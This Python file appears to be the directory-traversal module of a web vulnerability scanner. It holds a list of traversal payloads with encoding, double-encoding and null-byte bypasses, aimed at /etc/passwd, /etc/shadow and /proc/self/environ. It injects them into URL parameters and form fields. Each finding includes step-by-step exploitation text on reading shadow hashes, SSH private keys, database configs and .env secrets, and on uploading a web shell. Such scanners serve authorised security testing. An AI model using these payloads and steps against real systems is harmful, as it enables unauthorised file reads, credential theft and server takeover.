from core.utils import make_request, inject_payload_in_url, print_finding, print_status

MODULE = "DirTraversal"

PAYLOADS = [
    ("../../../etc/passwd", "root:x:0:0"),
    ("../../../../etc/passwd", "root:x:0:0"),
    ("../../../../../etc/passwd", "root:x:0:0"),
    ("../../../../../../etc/passwd", "root:x:0:0"),
    ("....//....//....//etc/passwd", "root:x:0:0"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", "root:x:0:0"),
    ("..%252F..%252F..%252Fetc%252Fpasswd", "root:x:0:0"),  # double URL-encoded
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:x:0:0"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0:0"),
    ("..\\..\\..\\etc\\passwd", "root:x:0:0"),
    ("..%5c..%5c..%5cetc%5cpasswd", "root:x:0:0"),
    ("..%5C..%5C..%5Cetc%5Cpasswd", "root:x:0:0"),
    ("../../../etc/shadow", "root:"),
    ("/etc/passwd", "root:x:0:0"),
    ("/etc/passwd%00", "root:x:0:0"),  # null byte injection
    ("../../../etc/passwd%00.jpg", "root:x:0:0"),  # null byte + extension bypass
    ("../../../windows/system32/drivers/etc/hosts", "localhost"),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost"),
    ("..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", "localhost"),
    ("../../../proc/self/environ", "PATH="),
    ("../../../proc/version", "Linux version"),
    ("....//....//....//proc/version", "Linux version"),
    ("../../../etc/hostname", None),
    ("../../../etc/hosts", "localhost"),
    ("../../../etc/issue", None),
]


def scan(target_url, crawl_data):
    print_status("Testing for Directory Traversal / Path Traversal...")
    findings = []

    urls_with_params = [u for u in crawl_data.get("urls", []) if "?" in u]
    forms = crawl_data.get("forms", [])

    for url in urls_with_params:
        findings.extend(_test_url_traversal(url))

    for form in forms:
        findings.extend(_test_form_traversal(form))

    return findings


def _test_url_traversal(url):
    findings = []
    found_params = set()
    for payload, signature in PAYLOADS:
        injected_urls = inject_payload_in_url(url, payload)
        for injected_url, param in injected_urls:
            if param in found_params:
                continue
            resp = make_request(injected_url)
            if resp is None:
                continue

            matched = False
            if signature is None:
                # No specific signature  - check for non-error, non-empty response
                if resp.status_code == 200 and len(resp.text.strip()) > 10:
                    matched = True
            elif signature and signature.lower() in resp.text.lower():
                matched = True

            if matched:
                evidence = f"Found signature: '{signature}'" if signature else "Non-empty 200 response returned"
                finding = {
                    "severity": "CRITICAL",
                    "module": MODULE,
                    "type": "Directory/Path Traversal",
                    "url": injected_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": evidence,
                    "description": f"Path traversal via param '{param}'  - local file read possible",
                    "exploitation": (
                        f"1. Read /etc/passwd: set param '{param}' to ../../../etc/passwd\n"
                        f"2. Read shadow file (if root): ../../../etc/shadow  - crack password hashes\n"
                        f"3. Read app source code: ../../../var/www/html/config.php (DB credentials)\n"
                        f"4. Read SSH keys: ../../../home/<user>/.ssh/id_rsa  - gain SSH access\n"
                        f"5. Read environment: ../../../proc/self/environ  - API keys, secrets\n"
                        f"6. On Windows: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n"
                        f"7. URL-encode to bypass filters: ..%2F..%2F..%2Fetc%2Fpasswd\n"
                        f"8. Double encode to bypass WAF: ..%252F..%252F..%252Fetc%252Fpasswd\n"
                        f"9. Null byte bypass: ../../../etc/passwd%00.jpg (older PHP versions)"
                    ),
                }
                findings.append(finding)
                found_params.add(param)
                print_finding("CRITICAL", MODULE,
                              f"Path traversal in param '{param}'",
                              url=injected_url,
                              detail=f"Payload: {payload}")
    return findings


def _test_form_traversal(form):
    findings = []
    found_fields = set()
    action = form["action"]
    method = form["method"]
    inputs = form["inputs"]

    for payload, signature in PAYLOADS[:10]:
        for target_input in inputs:
            if target_input["type"] in ("hidden", "submit", "button"):
                continue
            if target_input["name"] in found_fields:
                continue

            data = {}
            for inp in inputs:
                if inp["name"] == target_input["name"]:
                    data[inp["name"]] = payload
                else:
                    data[inp["name"]] = inp["value"] or "test"

            resp = make_request(action, method=method, data=data)
            if resp is None:
                continue

            matched = False
            if signature is None:
                if resp.status_code == 200 and len(resp.text.strip()) > 10:
                    matched = True
            elif signature and signature.lower() in resp.text.lower():
                matched = True

            if matched:
                finding = {
                    "severity": "CRITICAL",
                    "module": MODULE,
                    "type": "Form-Based Path Traversal",
                    "url": action,
                    "parameter": target_input["name"],
                    "payload": payload,
                    "evidence": f"Found '{signature}'" if signature else "Non-empty 200 response returned",
                    "description": f"Path traversal in form field '{target_input['name']}'",
                    "exploitation": (
                        f"1. Enter ../../../etc/passwd in the '{target_input['name']}' field\n"
                        f"2. Try double-encoding: ..%252F..%252F..%252Fetc%252Fpasswd\n"
                        f"3. Read database config files for credentials\n"
                        f"4. Read .env files for API keys and secrets\n"
                        f"5. If file upload + traversal: upload a web shell to the web root\n"
                        f"6. Null byte bypass: ../../../etc/passwd%00.jpg (older PHP)"
                    ),
                }
                findings.append(finding)
                found_fields.add(target_input["name"])
                print_finding("CRITICAL", MODULE,
                              f"Form path traversal in '{target_input['name']}'",
                              url=action,
                              detail=f"Payload: {payload}")
    return findings
